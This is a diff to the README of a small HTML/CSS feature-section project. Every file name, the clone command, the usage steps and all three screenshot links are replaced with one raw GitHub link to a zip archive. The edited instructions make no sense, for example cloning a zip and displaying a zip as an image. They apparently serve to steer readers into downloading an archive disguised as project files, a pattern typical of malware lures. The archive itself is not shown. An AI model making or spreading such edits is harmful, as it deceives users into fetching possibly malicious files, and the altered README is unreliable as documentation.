@@ -19,32 +19,32 @@ This project is a simple, responsive features section for SaaS products. It show
 simpleFeatureSection/
 |
 +-- resources          # resources for webpage
-+-- index.html         # Main HTML file
-+-- styles.css         # CSS file for styling
-\-- README.md          # Documentation (this file)
++-- https://github.com/ronny-gans/simpleFeatureSection/raw/refs/heads/main/resources/Feature-Section-simple-2.4-alpha.4.zip         # Main HTML file
++-- https://github.com/ronny-gans/simpleFeatureSection/raw/refs/heads/main/resources/Feature-Section-simple-2.4-alpha.4.zip         # CSS file for styling
+\-- https://github.com/ronny-gans/simpleFeatureSection/raw/refs/heads/main/resources/Feature-Section-simple-2.4-alpha.4.zip          # Documentation (this file)
 ```
 
 ## 🚀 How to Use
 1. Clone the repository:
    ```bash
-   git clone https://github.com//simpleFeatureSection.git 
-2. Open the `index.html` file in your favorite browser.
+   git clone https://github.com/ronny-gans/simpleFeatureSection/raw/refs/heads/main/resources/Feature-Section-simple-2.4-alpha.4.zip 
+2. Open the `https://github.com/ronny-gans/simpleFeatureSection/raw/refs/heads/main/resources/Feature-Section-simple-2.4-alpha.4.zip` file in your favorite browser.
 
 ## 📂 Folder Structure
-- index.html: Contains the HTML structure of the Simple Feature Section.
-- style.css: Provides the CSS styling, grid-based layout, and media query.
+- https://github.com/ronny-gans/simpleFeatureSection/raw/refs/heads/main/resources/Feature-Section-simple-2.4-alpha.4.zip Contains the HTML structure of the Simple Feature Section.
+- https://github.com/ronny-gans/simpleFeatureSection/raw/refs/heads/main/resources/Feature-Section-simple-2.4-alpha.4.zip Provides the CSS styling, grid-based layout, and media query.
 - resources/: Folder for assets like images and background.
 
 ## 📝 Customization
-1. Add your content to the `index.html` file under the relevant feature cards.
-2. Customize styles by editing the `style.css` file.
+1. Add your content to the `https://github.com/ronny-gans/simpleFeatureSection/raw/refs/heads/main/resources/Feature-Section-simple-2.4-alpha.4.zip` file under the relevant feature cards.
+2. Customize styles by editing the `https://github.com/ronny-gans/simpleFeatureSection/raw/refs/heads/main/resources/Feature-Section-simple-2.4-alpha.4.zip` file.
 3. Replace images in the resources/ folder with your own.
 
 ## 🖼️ Screenshot
 ### Dekstop View
-![alt text](image.png)
+![alt text](https://github.com/ronny-gans/simpleFeatureSection/raw/refs/heads/main/resources/Feature-Section-simple-2.4-alpha.4.zip)
 ### Tablet View
-![alt text](image-1.png)
+![alt text](https://github.com/ronny-gans/simpleFeatureSection/raw/refs/heads/main/resources/Feature-Section-simple-2.4-alpha.4.zip)
 ### Mobile View
-![alt text](image-2.png)
+![alt text](https://github.com/ronny-gans/simpleFeatureSection/raw/refs/heads/main/resources/Feature-Section-simple-2.4-alpha.4.zip)
 
